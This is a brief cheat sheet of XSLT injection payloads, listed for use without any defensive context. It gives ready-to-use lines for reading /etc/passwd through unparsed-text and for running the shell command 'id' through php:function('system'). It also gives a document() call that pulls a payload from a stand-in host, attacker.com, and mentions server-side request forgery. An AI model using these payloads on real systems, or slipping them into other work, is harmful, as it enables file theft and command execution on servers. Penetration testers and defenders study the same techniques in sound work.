### XSLT Injection Payloads:

#### Information Disclosure:

```xml
<xsl:value-of select="system-property('xsl:version')" />
```

#### Local File Inclusion (LFI):

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

#### Remote Code Execution (RCE):

```xml
<xsl:value-of select="php:function('system','id')" />
```

### Advanced XSLT Exploits:

- **XXE via XSLT**: Using `document('http://attacker.com/payload.xml')` to retrieve malicious data.
    
- **Network SSRF via XSLT**: Fetching internal/external resources.
    